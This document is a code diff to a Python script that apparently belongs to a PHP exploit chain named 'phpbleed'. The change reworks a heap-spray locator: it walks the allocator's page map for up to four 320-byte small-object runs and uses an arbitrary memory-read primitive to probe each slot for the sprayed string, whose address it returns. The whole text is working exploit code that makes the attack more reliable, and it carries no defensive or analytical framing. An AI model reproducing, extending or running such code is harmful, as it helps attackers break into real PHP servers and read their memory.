@@ -92,7 +92,7 @@ def gnu_hash_lookup_window(wdata, wbase, gh_addr, symtab, strtab, names):
 
 
 
-def isstring_read(fake_str_addr, timeout=5):
+def isstring_read(fake_str_addr, timeout=5) -> "tuple[int, bytes] | None":
     raise RuntimeError("orchestrator must set phpbleed_chain.isstring_read")
 
 
@@ -720,35 +720,38 @@ def find_spray_slot(heap_ref):
     if len(cdata) < MAP_OFF + 512 * 4:
         return None
 
-    bin320_start = None
+    runs = []
     for pn in range(1, 512):
         info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
         is_srun = (info & 0x80000000) != 0
         is_lrun = (info & 0x40000000) != 0
         if is_srun and not is_lrun and (info & 0x1F) == 16:
-            bin320_start = pn
             free_count = (info >> 16) & 0x1FF
             print(f"  Bin-320 SRUN at page {pn}, free_count={free_count}")
-            break
+            runs.append(pn)
+            if len(runs) >= 4:
+                break
 
-    if bin320_start is None:
+    if not runs:
         return None
 
-    run_start = chunk_base + bin320_start * 0x1000
-    print(f"  Run start = 0x{run_start:x}")
+    for pn in runs:
+        run_start = chunk_base + pn * 0x1000
+        print(f"  Run start = 0x{run_start:x} (page {pn})")
 
-    # Probe each 320-byte slot looking for our 280-byte spray string.
-    for slot in range(64):
-        addr = run_start + slot * 320
-        r2 = isstring_read(addr)
-        if r2 is None:
-            continue
-        slen, _ = r2
-        if slen == SPRAY_LEN:
-            S = addr + 0x18
-            print(f"  Found spray at slot {slot} @ 0x{addr:x}")
-            print(f"  S = 0x{S:x}")
-            return S
+        # Probe each 320-byte slot looking for our 280-byte spray string.
+        # 204 slots = one 64K page worth at 320B spacing.
+        for slot in range(204):
+            addr = run_start + slot * 320
+            r2 = isstring_read(addr)
+            if r2 is None:
+                continue
+            slen, _ = r2
+            if slen == SPRAY_LEN:
+                S = addr + 0x18
+                print(f"  Found spray at slot {slot} @ 0x{addr:x}")
+                print(f"  S = 0x{S:x}")
+                return S
     return None
 
 
